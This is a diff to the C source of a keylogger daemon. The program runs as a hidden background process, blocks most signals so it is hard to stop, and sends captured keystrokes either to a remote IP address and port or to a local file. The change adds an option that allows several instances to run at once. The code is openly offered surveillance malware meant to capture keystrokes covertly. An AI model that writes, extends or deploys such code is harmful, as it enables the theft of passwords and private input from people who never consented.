@@ -10,7 +10,6 @@
 #include <fcntl.h>
 #include "daemon.h"
 #include "keylogger.h"
-#include "network-ipc.h"
 
 #define SOCKET 1
 #define FILE 2
@@ -20,17 +19,20 @@ int unblockSignal(int signum);
 
 int main(int argc, char **argv)
 {
-    int fd, keyboard, flock;
-    int file_out_type;
+    int fd, keyboard, flock, file_out_type;
+    int is_single_instance;
 
-    if (argc != 4 && argc != 3)
-        fprintf(stderr, "Usage: ./keylogger-daemon 1 ip port OR ./keylogger-daemon 2 filename\n"), exit(EXIT_FAILURE);
+    if (argc != 5 && argc != 4)
+        fprintf(stderr, "Usage: ./keylogger-daemon 1 ip port [0|1] OR ./keylogger-daemon 2 filename [0|1]\n"), exit(EXIT_FAILURE);
 
     if (daemonize("keylogger-daemon") < 0) // Convert process to daemon
         syslog(LOG_ERR, "Couldn't start daemon"), exit(EXIT_FAILURE);
 
-    if ((flock = daemonAlreadyRunning())) // If a copy of this daemon is already running we terminate. We return the lock file descriptor
-        exit(EXIT_FAILURE);
+    is_single_instance = (argc == 5 ? atoi(argv[4]) : atoi(argv[3]));
+
+    if (is_single_instance)
+        if ((daemonAlreadyRunning(&flock))) // If a copy of this daemon is already running we terminate. We return the lock file descriptor
+            exit(EXIT_FAILURE);
 
     if (blockAllSignals() < 0) // Blocking all signals
         syslog(LOG_ERR, "Couldn't set signal bitmask%s", strerror(errno)), exit(EXIT_FAILURE);
@@ -50,9 +52,9 @@ int main(int argc, char **argv)
     }
     else if (file_out_type == FILE) // If user decided to save events locally
     {
-        char *file_path = argv[2];
-        if ((fd = open(file_path, O_WRONLY | O_CREAT | O_APPEND | O_TRUNC, S_IRUSR)) < 0)
-            syslog(LOG_ERR, "Couldn't open file %s: %s", file_path, strerror(errno)), exit(EXIT_FAILURE);
+        char *file_out_path = argv[2];
+        if ((fd = open(file_out_path, O_WRONLY | O_CREAT | O_APPEND | O_TRUNC, S_IRUSR)) < 0)
+            syslog(LOG_ERR, "Couldn't open file %s: %s", argv[2], strerror(errno)), exit(EXIT_FAILURE);
         unblockSignal(SIGTERM); // We can terminate daemon only by sending SIGTERM or SIGKILL/SIGSTOP(not adviced)
     }
 
